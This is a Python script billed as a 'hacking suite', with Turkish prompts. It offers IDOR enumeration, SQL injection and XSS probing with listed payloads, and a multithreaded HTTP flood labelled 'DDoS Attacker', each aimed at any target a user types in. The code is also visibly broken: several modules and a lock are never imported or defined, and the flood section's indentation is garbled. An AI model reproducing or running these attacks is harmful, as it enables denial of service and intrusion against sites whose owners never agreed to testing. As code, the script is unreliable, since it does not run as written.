import time
import requests
import random

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
]

print(r"""
  ███╗   ███╗ ██████╗██╗   ██╗ ██╗███████╗ ██████╗ 
  ████╗ ████║██╔════╝██║   ██║███║╚══███╔╝██╔═══██╗
  ██╔████╔██║██║     ██║   ██║╚██║  ███╔╝ ██║   ██║
  ██║╚██╔╝██║██║     ╚██╗ ██╔╝ ██║ ███╔╝  ██║   ██║
  ██║ ╚═╝ ██║╚██████╗ ╚████╔╝  ██║███████╗╚██████╔╝
  ╚═╝     ╚═╝ ╚═════╝  ╚═══╝   ╚═╝╚══════╝ ╚═════╝ 

[ McV1zo Hacking Suite ] [V3.3] [ Developed By McV1zo ]
""")
print("1 -> TRIDOR (IDOR Tarayıcı)")
print("2 -> TRSQL (SQL Injection Tarayıcı)")
print("3 -> TRXSS (XSS Tarayıcı)")
print("4 -> DDoS Attacker (DDoS Atıcı)")
secim = input("\nYapilacak islemi sec reis (1-4): ")

if secim == "1":
    print(r"""  ______ ____     ____ ___   ____   ____ 
 /_  __// __ \   /  _// __ \ / __ \ / __ \
  / /  / /_/ /   / / / / / // / / // /_/ / 
 / /  / _, _/  _/ / / /_/ // /_/ // _, _/ 
/_/  /_/ |_|  /___//_____/ \____//_/ |_|    [ Developed By McV1zo ]
""")
    hedef_url = ""
    while not hedef_url.strip():
        hedef_url = input("Hedef URL'yi girin: ")
        
    parametre_adi = ""
    while not parametre_adi.strip():
        parametre_adi = input("Taranacak parametre adini girin: ")
        
    baslangic_id = int(input("Baslangic ID degerini girin: "))
    bitis_id = int(input("Bitis ID degerini girin: "))
        
    print(f"\n[*] {hedef_url} adresi icin IDOR taramasi baslatiliyor...\n")
        
    istek_basliklari = {
            "User-Agent": random.choice(user_agents)
        }
        
    try:
        referans_yanit = requests.get(hedef_url, params={parametre_adi: baslangic_id}, headers=istek_basliklari, timeout=5)
        referans_boyut = len(referans_yanit.text)
    except requests.exceptions.RequestException:
        print("[-] Hedef sunucuya ilk baglanti saglanamadi reis!")
        referans_boyut = 0
            
    if referans_boyut > 0:
        for idor in range(baslangic_id, bitis_id + 1):
            parametre = {parametre_adi: idor}
            try:
                yanit = requests.get(hedef_url, params=parametre, headers=istek_basliklari, timeout=5)
                
                if yanit.status_code == 200 or yanit.status_code == 201:
                    guncel_boyut = len(yanit.text)
                    
                    if guncel_boyut != referans_boyut and "error" not in yanit.text.lower():
                        print(f"[+] POTANSIYEL IDOR BULUNDU == {parametre_adi}: {idor} (Farkli Boyut: {guncel_boyut})")
                    else:
                        print(f"[-] {parametre_adi}: {idor} aktif ama veriler ayni veya hata dondu.")
                else:
                    print(f"[-] {parametre_adi}: {idor} erisime kapali. HTTP {yanit.status_code}")
                    
            except requests.exceptions.RequestException:
                print(f"[-] ID {idor} icin istek zaman asimina ugradi, geciliyor...")
                continue
                    
    input("\nTarama bitti. Ana menuye donmek icin Enter'a bas reis...")

elif secim == "2":
    print(r"""  ______ ____   _____ ____     __   
 /_  __// __ \ / ___// __ \   / /   
  / /  / /_/ / \__ \/ / / /  / /    
 / /  / _, _/ ___/ / /_/ /  / /___  
/_/  /_/ |_| /____/\___\_\ /_____/      [ Developed By McV1zo ]
""")
    sql_url = ""
    while not sql_url.strip():
        sql_url = input("SQL acigi aranacak site URL'sini girin: ")
        
    parametre_adi = ""
    while not parametre_adi.strip():
        parametre_adi = input("Test edilecek parametre adini girin: ")
        
    print(f"\n[*] SQL Acigi taramasi yapiliyor...\n")
    
    payloadlar = [
        "'", '"', "' OR 1=1 --", '" OR 1=1 --',
        "'; WAITFOR DELAY '0:0:5'--", "'; SELECT SLEEP(5)--"
    ]
    hata_kelimeleri = ["sql syntax", "mysql", "mariadb", "postgresql", "oracle", "syntax error", "sqlite"]
    
    for sql in payloadlar:
        parametre = {parametre_adi: sql}
        try:
            baslangic_zamani = time.time()
            yanit = requests.get(sql_url, params=parametre, headers={"User-Agent": random.choice(user_agents)}, timeout=10)
            gecen_sure = time.time() - baslangic_zamani
            
            sayfa_icerigi = yanit.text.lower()
            acik_var_mi = any(kelime in sayfa_icerigi for kelime in hata_kelimeleri)
            
            if acik_var_mi or yanit.status_code == 500 or gecen_sure >= 4 or "success" in sayfa_icerigi:
                print(f"[+] Jackpotttt!!! SQL acigi bulundu!")
                print(f"    Calisan Payload: {sql} | Yanit Suresi: {gecen_sure:.2f} sn")
                break
            else:
                print(f"[-] Sql acigi yok kanka... Payload: {sql}")
        except requests.exceptions.RequestException:
            print(f"[-] Payload {sql} icin istek zaman asimina ugradi, geciliyor...")
            continue
            
    input("\nTarama bitti. Ana menuye donmek icin Enter'a bas reis...")

elif secim == "3":
    print(r"""
  ______ ____    _  __ _____ _____
 /_  __// __ \  | |/ // ___// ___/
  / /  / /_/ /  |   / \__ \ \__ \ 
 / /  / _, _/  /   | ___/ /___/ / 
/_/  /_/ |_|  /_/|_|/____//____/    [ Developed By McV1zo ]       
""")

    xss_url = ""
    while not xss_url.strip():
        xss_url = input("XSS açığı aranacak site URL'sini girin: ")
        
    parametre_adi = ""
    while not parametre_adi.strip():
        parametre_adi = input("Test edilecek parametre adini girin: ")
        
    print(f"\n[*] XSS Acigi taramasi yapiliyor...\n")

    payloadlar = [
        "<script>alert(1)</script>",
        '"><script>alert("XSS")</script>',
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        '"><svg onload=alert(1)>',
        "<body onload=alert(1)>",
        "javascript:alert(1)"
    ]

    for xss in payloadlar:
        parametre = {parametre_adi: xss}
        try:
            yanit = requests.get(xss_url, params=parametre, headers={"User-Agent": random.choice(user_agents)}, timeout=5)
            
            if yanit.status_code == 200 and ("success" in yanit.text or xss in yanit.text):
                print(f"[+] Jackpotttt!!! XSS açığı potansiyeli bulundu!")
                print(f"    Yansiyan Payload: {xss}")
            else:
                print(f"[-] XSS kodu yansimadi. Payload: {xss}")
                
        except requests.exceptions.RequestException:
            print(f"[-] Payload {xss} için istek zaman asimina ugradi.")
            continue

    input("\nTarama bitti. Ana menuye donmek icin Enter'a bas reis...")

if secim == "4":
        def saldiri(hedef_ip, bandwidth_port):
            global toplam_gonderilen, saldiri_devam_ediyor
            methodlar = ["GET", "POST", "HEAD", "OPTIONS"]
            referers = [
                "https://google.com",
                "https://bing.com",
                "https://duckduckgo.com",
                "https://github.com"
            ]
            while saldiri_devam_ediyor:  
                try:
                    ham_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    ham_socket.settimeout(3)
                    
                    if bandwidth_port == 443:
                        baglam = ssl.create_default_context()
                        baglam.check_hostname = False
                        baglam.verify_mode = ssl.CERT_NONE
                        s = baglam.wrap_socket(ham_socket, server_hostname=hedef_ip)
                    else:
                        s = ham_socket
                        
                    s.connect((hedef_ip, bandwidth_port))
                    yerel_ip, yerel_port = s.getsockname()
                
                    while saldiri_devam_ediyor:
                        rastgele_ua = random.choice(user_agents)
                        rastgele_ref = random.choice(referers)
                        rastgele_method = random.choice(methodlar)
                        
                        http_istegi = (
                            f"{rastgele_method} / HTTP/1.1\r\n"
                            f"Host: {hedef_ip}\r\n"
                            f"User-Agent: {rastgele_ua}\r\n"
                            f"Referer: {rastgele_ref}\r\n"
                            f"Cache-Control: no-cache\r\n"
                            f"Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7\r\n"
                            f"Connection: keep-alive\r\n\r\n"
                        )
                        http_bytes = http_istegi.encode('utf-8')
                        s.send(http_bytes)
                    
                        with sayac_kilidi:
                            toplam_gonderilen += 1
                            guncel_sayac = toplam_gonderilen
                        
                        print(f"[PACKET-ID: {guncel_sayac}] [SRC: {yerel_ip}:{yerel_port}] ===> [TARGET: {hedef_ip}:{bandwidth_port}] [METHOD: {rastgele_method}] [STATUS: SENT]")
                    
                except Exception:
                    try:
                        s.close()
                    except:
                        pass
                
                print(f"[WARNING] [TARGET: {hedef_ip}:{bandwidth_port}] [STATUS: CONNECTION_TIMEOUT / REFUSED]")
                time.sleep(0.01)
                
def gosterge_paneli(baslangic_zamani, saldiri_suresi):
        global saldiri_devam_ediyor
        while saldiri_devam_ediyor:
            gecen_sure = int(time.time() - baslangic_zamani)
            kalan_sure = saldiri_suresi - gecen_sure
            if kalan_sure <= 0:
                saldiri_devam_ediyor = False
                break
            time.sleep(1)

print(r"""
     ____   ____          _____    ___   __  __               __                 
   / __ \ / __ \ ____   / ___/   /   | / /_/ /_ ____ _ _____/ /__ ___   _____   
  / / / // / / // __ \  \__ \   / /| |/ __/ __// __ `// ___/ //_// _ \ / ___/   
 / /_/ // /_/ // /_/ / ___/ /  / ___ / /_/ /_ / /_/ // /__/ ,<  /  __// /       
/_____//_____/ \____/ /____/  /_/  |_|\__/\__/ \__,_/ \___/_/|_| \___//_/        
                                                                                
                            [ Developed By McV1zo ]           
 
    """)

hedef_host_girisi = ""
while not hedef_host_girisi.strip():
    hedef_host_girisi = input("Test edilecek hedef IP veya Domain adresini girin: ")

bandwidth_port = 0
while bandwidth_port <= 0:
    try:
        girdi_port = input("Port numarasini girin (Orn: 80 veya 443): ")
        if girdi_port.strip():
            bandwidth_port = int(girdi_port)
    except ValueError:
        bandwidth_port = 0

saldiri_suresi = 0
while saldiri_suresi <= 0:
    try:
        girdi_sure = input("Yuk testi suresi (Saniye): ")
        if girdi_sure.strip():
            saldiri_suresi = int(girdi_sure)
    except ValueError:
        saldiri_suresi = 0

thread_sayisi = 0
while thread_sayisi <= 0:
    try:
        girdi_thread = input("Thread (Kanal) sayisini girin (Orn: 50): ")
        if girdi_thread.strip():
            thread_sayisi = int(girdi_thread)
    except ValueError:
        thread_sayisi = 0
            
try:
        hedef_ip = socket.gethostbyname(hedef_host_girisi)
        print(f"[+] Domain Cozuldu -> Hedef IP: {hedef_ip}")
except socket.gaierror:
        hedef_ip = hedef_host_girisi
        print(f"[*] IP adresi dogrudan kabul edildi: {hedef_ip}")
                
toplam_gonderilen = 0
saldiri_devam_ediyor = True
baslangic_zamani = time.time()
            
print(f"\n[*] {hedef_ip}:{bandwidth_port} uzerinde canli veri akisi baslatildi...\n")
            
for _ in range(thread_sayisi):
        t = threading.Thread(target=saldiri, args=(hedef_ip, bandwidth_port))
        t.daemon = True
        t.start()
                
gosterge_paneli(baslangic_zamani, saldiri_suresi)
saldiri_devam_ediyor = False
print(f"\n\n[+] Yuk testi tamamlandi. Toplam Basarili Paket: {toplam_gonderilen}")
input("\nAna menuye donmek icin Enter'a bas reis...")
